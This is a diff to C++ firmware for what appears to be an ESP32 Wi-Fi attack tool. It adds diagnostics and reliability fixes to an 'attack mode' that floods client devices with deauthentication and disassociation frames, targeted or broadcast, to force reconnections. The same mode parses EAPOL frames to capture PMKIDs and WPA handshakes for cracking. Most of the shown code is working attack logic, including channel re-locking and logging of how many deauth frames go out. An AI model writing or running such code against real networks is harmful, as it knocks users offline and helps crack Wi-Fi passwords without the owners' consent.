@@ -212,6 +212,9 @@ uint8_t SpectrumMode::attackChannel = 0;
 uint32_t SpectrumMode::attackStartTime = 0;
 uint32_t SpectrumMode::lastAttackDeauth = 0;
 uint32_t SpectrumMode::deauthCount = 0;
+uint32_t SpectrumMode::deauthTxErrors = 0;
+uint32_t SpectrumMode::eapolRxCount = 0;
+uint32_t SpectrumMode::eapolRxNoKey = 0;
 SpectrumPMKID SpectrumMode::capturedPMKIDs[4] = {};
 uint8_t SpectrumMode::capturedPMKIDCount = 0;
 volatile bool SpectrumMode::pendingAttackPMKID = false;
@@ -2311,14 +2314,14 @@ void SpectrumMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t
     if (payload[offset] != 0xAA || payload[offset+1] != 0xAA ||
         payload[offset+6] != 0x88 || payload[offset+7] != 0x8E) return;
     
-    // EAPOL payload starts after LLC/SNAP (8 bytes)
+    eapolRxCount++;
+    
     const uint8_t* eapolPayload = payload + offset + 8;
     uint16_t eapolLen = len - offset - 8;
     if (eapolLen < 4) return;
     
-    // Only EAPOL-Key (type 3)
-    if (eapolPayload[1] != 3) return;
-    if (eapolLen < 99) return;
+    if (eapolPayload[1] != 3) { eapolRxNoKey++; return; }
+    if (eapolLen < 99) { eapolRxNoKey++; return; }
     
     // Key info → determine message number
     uint16_t keyInfo = (eapolPayload[5] << 8) | eapolPayload[6];
@@ -2333,7 +2336,7 @@ void SpectrumMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t
     else if (keyAck && keyMic && install) messageNum = 3;
     else if (!keyAck && keyMic && secure) messageNum = 4;
     
-    if (messageNum == 0) return;
+    if (messageNum == 0) { eapolRxNoKey++; return; }
     
     // ========== PMKID extraction from M1 ==========
     if (messageNum == 1 && eapolPayload[4] == 0x02 && eapolLen >= 121) {
@@ -2825,6 +2828,11 @@ void SpectrumMode::enterAttackMode() {
     attackPmkidRead = 0;
     attackPmkidWrite = 0;
 
+    deauthCount = 0;
+    deauthTxErrors = 0;
+    eapolRxCount = 0;
+    eapolRxNoKey = 0;
+
     // Clear any stale entries
     memset(capturedPMKIDs, 0, sizeof(capturedPMKIDs));
     memset((void*)attackPMKIDPool, 0, sizeof(attackPMKIDPool));
@@ -2862,8 +2870,8 @@ void SpectrumMode::exitAttackMode() {
         NetworkRecon::unlockChannel();
     }
 
-    Serial.printf("[SPECTRUM] Attack stopped — %lu deauths, %d PMKID(s), %d handshake(s)\r\n",
-                  deauthCount, capturedPMKIDCount, capturedHandshakeCount);
+    Serial.printf("[SPECTRUM] Attack stopped — %lu deauths, %d PMKID(s), %d handshake(s), eapol=%lu nokey=%lu\r\n",
+                  deauthCount, capturedPMKIDCount, capturedHandshakeCount, eapolRxCount, eapolRxNoKey);
 }
 
 void SpectrumMode::updateAttackMode() {
@@ -2967,6 +2975,17 @@ void SpectrumMode::updateAttackMode() {
     if (now - lastAttackDeauth < 180) return;
     lastAttackDeauth = now;
 
+    // Skip channel verification if NetworkRecon is paused (WiFi state unstable during pause/resume)
+    if (!NetworkRecon::isPaused()) {
+        uint8_t actualCh = 0;
+        wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;
+        esp_wifi_get_channel(&actualCh, &secondCh);
+        if (actualCh != attackChannel && actualCh != 0) {
+            Serial.printf("[SPECTRUM] CH MISMATCH! attackCh=%d actualCh=%d — re-locking\r\n", attackChannel, (int)actualCh);
+            NetworkRecon::lockChannel(attackChannel);
+        }
+    }
+
     // Get client list for targeted deauths
     int clientCount = 0;
     if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
@@ -2975,26 +2994,33 @@ void SpectrumMode::updateAttackMode() {
 
     const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
+    uint32_t txOk = 0, txErr = 0;
+
     if (clientCount > 0) {
-        // TARGETED deauth — up to 4 clients per cycle (matches OINK)
         const SpectrumNetwork& net = networks[monitoredNetworkIndex];
         int toDeauth = min(clientCount, 4);
         for (int i = 0; i < toDeauth; i++) {
-            WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel,
-                                         net.clients[i].mac, 7);
+            if (WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel, net.clients[i].mac, 7)) txOk++; else txErr++;
             deauthCount++;
             delay(3);
-            // Also disassoc
-            WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel,
-                                         net.clients[i].mac, 2);
+            if (WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel, net.clients[i].mac, 2)) txOk++; else txErr++;
             delay(3);
         }
     } else {
-        // BROADCAST deauth fallback (no clients known)
-        WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel, broadcast, 7);
+        if (WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel, broadcast, 7)) txOk++; else txErr++;
         deauthCount++;
         delay(3);
-        WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel, broadcast, 2);
+        if (WSLBypasser::sendDeauthFrame(attackBSSID, attackChannel, broadcast, 2)) txOk++; else txErr++;
+    }
+
+    {
+        static uint32_t lastTxLog = 0;
+        static uint32_t totalErr = 0;
+        totalErr += txErr;
+        if ((txErr > 0 || (now - lastTxLog > 5000)) && (now - lastTxLog > 1000)) {
+            lastTxLog = now;
+            Serial.printf("[SPECTRUM] deauth tx_ok=%lu tx_err=%lu total_err=%lu\r\n", txOk, txErr, totalErr);
+        }
     }
 }
 
@@ -3190,14 +3216,8 @@ void SpectrumMode::autoSaveCaptures() {
     
     bool anySaved = false;
     
-    // Pause promiscuous for safe SD access
-    bool pausedByUs = false;
-    if (NetworkRecon::isRunning()) {
-        NetworkRecon::pause();
-        pausedByUs = true;
-    }
-    delay(5);
-    
+    // No need to pause promiscuous for SD writes (WiFi radio vs SPI - separate hardware)
+
     const char* handshakesDir = SDLayout::handshakesDir();
     if (!SD.exists(handshakesDir)) {
         SD.mkdir(handshakesDir);
@@ -3275,10 +3295,6 @@ void SpectrumMode::autoSaveCaptures() {
             if (hs.saveAttempts >= 3) hs.saved = true;
         }
         delay(1);
-    }
-    
-    if (pausedByUs) {
-        NetworkRecon::resume();
     }
     
     if (anySaved) {
